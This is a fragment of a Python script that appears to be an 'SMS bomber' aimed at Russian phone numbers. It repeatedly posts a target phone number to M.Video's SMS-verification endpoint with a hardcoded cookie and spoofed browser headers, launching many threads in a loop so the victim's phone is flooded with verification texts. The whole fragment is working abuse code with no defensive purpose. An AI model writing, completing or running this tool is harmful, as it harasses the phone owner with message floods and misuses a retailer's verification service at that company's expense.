';TS01ce11b2=01ed0a41c8db23e98adbf724600dcaa4a69363eb702e5e5714b57c1c5145d67beb858c9a248fd9a16d3ff119482bc952c7e3b8812c;uxs_uid=ea77bc50-1d9c-11e9-9009-53c0a7c4cdb3;wurfl_device_id=generic_web_browser;'
        rMV = requests.post('https://www.mvideo.ru/sitebuilder/components/phoneVerification/sendSmsCode.json.jsp', data={'phone': phone[2:]}, headers={'Accept-Encoding':'gzip, deflate, br',  'Accept-Language':'en-US,en;q=0.5',  'Connection':'keep-alive',  'Cookie':newcook,  'Host':'www.mvideo.ru',  'Referer':'https://www.mvideo.ru/register?sn=false',  'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',  'X-Requested-With':'XMLHttpRequest'})
        if rMV.status_code == 200:
            print(colored(m1, 'green'))
        else:
            print(colored(m2, 'red'))


tM = Thread(target=main)
tM.start()
if phone[0:3] == '+79':
    while currT <= countT:
        t = Thread(target=mv)
        t.start()
        currT += 1